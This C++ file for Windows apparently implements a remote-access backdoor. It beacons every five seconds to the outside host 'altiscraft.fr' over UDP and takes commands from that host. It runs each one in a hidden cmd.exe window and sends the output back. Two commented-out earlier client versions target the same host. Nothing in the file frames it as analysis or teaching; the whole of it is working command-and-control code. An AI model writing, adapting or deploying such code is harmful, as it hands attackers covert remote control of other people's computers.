#include <stdio.h>
#include <winsock2.h>
#include <string>
#include <windows.h>
#include <thread>
#include <iostream>
#include <vector>

#define BUFLEN 65536
using namespace std;

struct sockaddr_in si_other;
int s, slen = sizeof(si_other);
vector<thread> execThreads;

void execute(string cmd)
{
    HANDLE stdOutHandles[2];

    // Setup the security attributes.
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create the pipe for stdout.
    if(!CreatePipe(&stdOutHandles[0], &stdOutHandles[1], &saAttr, 0))
    {
        return;
    }

    PROCESS_INFORMATION pInfo;
    ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));

    // Specify the pipe handle and make sure the window is hidden.
    STARTUPINFO startInfo;
    ZeroMemory(&startInfo, sizeof(STARTUPINFO));
    startInfo.cb = sizeof(STARTUPINFO);
    startInfo.hStdOutput = stdOutHandles[1];
    startInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startInfo.wShowWindow = SW_HIDE;

    // Call cscript.exe with slmgr.vbs -dlv as the parameters. Because of the nature of this command, I left the first parameter as NULL.
    char expandedCScript[MAX_PATH];
    ExpandEnvironmentStrings(string("%windir%\\System32\\cmd.exe /c " + cmd).c_str(), expandedCScript, MAX_PATH);
    if(!CreateProcess(NULL, expandedCScript, NULL, NULL, TRUE, 0, NULL, NULL, &startInfo, &pInfo))
    {
    CloseHandle(stdOutHandles[0]);
    CloseHandle(stdOutHandles[1]);
    return;
    }

    // Wait for cscript.exe to exit.
    WaitForSingleObject(pInfo.hProcess, INFINITE);

    // Read the output from cscript.exe
    char buffer[2048];
    DWORD readBufferSize;
    BOOL result;
    if((result = ReadFile(stdOutHandles[0], buffer, 2048, &readBufferSize, NULL)))
    {
    // ReadFile does not null-terminate the buffer so we do that manually.
    buffer[readBufferSize] = '\0';

    // Display the output.
    //MessageBox(NULL, buffer, NULL, MB_OK);
    }

    // Close the handles.
    CloseHandle(stdOutHandles[0]);
    CloseHandle(stdOutHandles[1]);
    CloseHandle(pInfo.hProcess);
    CloseHandle(pInfo.hThread);

    string output = string(buffer);
    if(sendto(s, output.c_str(), strlen(output.c_str()), 0, (struct sockaddr *)&si_other, slen) == SOCKET_ERROR)
        {
            printf("sendto() failed with error code: %d" , WSAGetLastError());
            exit(EXIT_FAILURE);
        }
}

void aliveFunction()
{
    string message = "Z alive";
    while(true)
    {
        if(sendto(s, message.c_str(), strlen(message.c_str()), 0, (struct sockaddr *)&si_other, slen) == SOCKET_ERROR)
        {
            printf("sendto() failed with error code: %d" , WSAGetLastError());
            exit(EXIT_FAILURE);
        }
        Sleep(5000);
    }
}

int main()
{
    WSADATA wsa;

    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("WSAStartup() failed with error code: %d", WSAGetLastError());
        exit(EXIT_FAILURE);
    }

    if((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR)
    {
        printf("socket() failed with error code: %d" , WSAGetLastError());
        exit(EXIT_FAILURE);
    }

    memset((char *)&si_other, 0, sizeof(si_other));
    si_other.sin_family = AF_INET;
    si_other.sin_port = htons(59724);// 59724 user 59725 admin
    si_other.sin_addr.S_un.S_addr = *(u_long*)gethostbyname("altiscraft.fr")->h_addr_list[0];
    thread aliveThread = thread(aliveFunction);
    while(true)
    {
        char buf[BUFLEN];
        if(recvfrom(s, buf, BUFLEN, 0, (struct sockaddr *)&si_other, &slen) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if(error == 10054 || error == 10022)
            {
                Sleep(100);
                continue;
            }
            printf("recvfrom() failed with error code: %d", error);
            exit(EXIT_FAILURE);
        }

        buf[strlen(buf) - 1] = 0;
        //cout << "|" << buf << "|" << endl;
        string cmd = buf;
        execThreads.push_back(thread(execute, cmd));
    }

    closesocket(s);
    WSACleanup();
    return 0;
}









/*#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <iostream>
#include <winsock2.h>

#define PORT     59725
#define MAXLINE 1024
using namespace std;

// Driver code
int main() {
WSADATA initWin32;
WSAStartup(MAKEWORD(2, 2), &initWin32);
    SOCKET sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd == SOCKET_ERROR)
	{
		cout << "Erreur création socket : " << endl;
		return -2;
	}

    char buffer[MAXLINE];
    char *hello = "Hello from client";
    sockaddr_in servaddr;

    // Filling server information

servaddr.sin_addr.s_addr = *(u_long*)gethostbyname("altiscraft.fr")->h_addr_list[0];
    servaddr.sin_port = htons(PORT);
    servaddr.sin_family = AF_INET;

    if (bind(sockfd, (struct sockaddr *) &servaddr, sizeof(servaddr)) != 0)
	{
		cout << "Erreur bind socket : " << endl;
		return -3;
	}

    int n;
   int len;

cout << "x3" << endl;
    sendto(sockfd, (const char *)hello, strlen(hello),
        0, (const struct sockaddr *) &servaddr,
            sizeof(servaddr));
    printf("Hello message sent.\n");

    n = recvfrom(sockfd, (char *)buffer, MAXLINE,
                0, (struct sockaddr *) &servaddr,
                &len);
    buffer[n] = '\0';
    printf("Server : %s\n", buffer);

    close(sockfd);
    return 0;
}
*/








/*#include <winsock2.h>
#include <cstdio>
#include <thread>
#include <string>
#include <vector>
#include <sstream>
#include <iostream>
using namespace std;

void print(string object)
{
    cout << object << endl;
}

void debug(string object)
{
    if(true)
        print(object);
}

void initializeNetwork(), connection(), receive(), sendStr(), closeConnection(), manageMsg(), verifyDisconnexion();
SOCKET socketId;
SOCKADDR_IN destination;
char buffer[65535] = "";
thread network, disconnected;
bool connected = true;
vector<string> msg;

int main()
{

    print("Network is loading...");
    WSADATA initWin32;
    socketId = socket(AF_INET, SOCK_STREAM, 0);
    WSAStartup(MAKEWORD(2, 2), &initWin32);
    destination.sin_family = AF_INET;

    destination.sin_addr.s_addr = *(u_long*)gethostbyname("altiscraft.fr")->h_addr_list[0];
    destination.sin_port = htons(59724);
    connection();
    print("Network is loaded !");
    receive();
    closeConnection();
}

void sendStr(string str)
{
    str += "#";
    debug("Send: " + str);
    strcpy(buffer, str.c_str());
    send(socketId, buffer, strlen(buffer), 0);
}

void connection()
{
    if(connect(socketId, (struct sockaddr*)&destination, sizeof(destination)) != 0)
    {
        print("Server not connected");
        connected = 0;
    }
}

void receive()
{
    thread manageMsgs(&manageMsg);
    manageMsgs.detach();
    sendStr("Connect test");
    while(true)
    {
        buffer[65535] = {0};
        int length = recv(socketId, buffer, 1515, 0); // if receive more than a char can switch from # - 1 to # + 1 so this algorithm doesn't treat in real time the info // do split ... if necessary
        if(length > 0) // str and buffer do not exactly contain same things ?
        {
            string rcv = buffer;
            if(rcv.back() == '#')
            {
                print(rcv);
                msg.push_back(rcv);
                memset(buffer, 0, sizeof(buffer));
            }
        }
        else if(connected == 0)
            break;
    }
    print("Server closed");
}

template<typename Out>
void split(const string &s, const char *delim, Out result)
{
    stringstream ss;
    ss.str(s);
    string item;
    while (getline(ss, item, *delim))
        *(result++) = item;
}

vector<string> split(const string &s, const char *delim)
{
    vector<string> elems;
    split(s, delim, back_inserter(elems));
    return elems;
}

bool startsWith(string subject, string test)
{
    return !subject.compare(0, test.size(), test);
}

string replace(string subject, const string& search, const string& replace)
{
    unsigned int s = subject.find(search);
    if(s > subject.length())
        return subject;
    return subject.replace(s, search.length(), replace);
}

void manageMsg()
{
    unsigned int i = 0;
    while(true)
    {
        if(msg.size() > i)
        {
            vector<string> msgs = split(msg[i], "#");
            for(unsigned int j = 0; j < msgs.size(); j++)
            {
                string message = msgs[j];
                if(message == "")
                    continue;
                debug("Received: " + message);

            }
            i++;
        }
        else if(!connected)
            break;
    }
}

void verifyDisconnexion()
{
    char bufferTmp[1];
    while(true)
    {
        int lengthTemp = recv(socketId, bufferTmp, 1, 0), error = WSAGetLastError();
        if(lengthTemp == 0 && error == 0)
            sendStr(" ");
        if(error == 10053)
            break;
    }
}

void closeConnection()
{
    shutdown(socketId, 2);
    closesocket(socketId);
    WSACleanup();
}

void freeNetwork()
{
    network.detach();
    disconnected.detach();
    closeConnection();
}
*/
